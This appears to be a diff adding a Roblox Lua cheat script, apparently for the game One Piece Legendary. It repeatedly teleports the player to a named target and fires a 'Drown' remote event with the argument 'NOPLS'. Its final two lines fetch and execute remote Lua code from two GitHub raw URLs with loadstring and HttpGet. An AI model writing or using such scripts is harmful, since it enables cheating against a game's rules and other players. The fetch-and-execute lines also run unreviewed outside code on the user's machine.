@@ -1,0 +1,18 @@
+for i,v in pairs(workspace:GetDescendants()) do
+    if v.ClassName == "Part" or v.ClassName == "WedgePart" then
+    v.Material = "SmoothPlastic"
+    end
+    end
+while wait(1) do
+    for i,v in pairs(game.Workspace:GetDescendants()) do
+        if v.Name == "APOLLO_W07" then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,0,-5)
+            end
+        end
+    local args = {
+    [1] = "NOPLS"
+    }
+    game:GetService("Players").LocalPlayer.Character.Drown:FireServer(unpack(args))
+end
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/norapichx/opl/main/blue')))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/AltsegoD/script/master/OnePieceLegendary.lua')))()
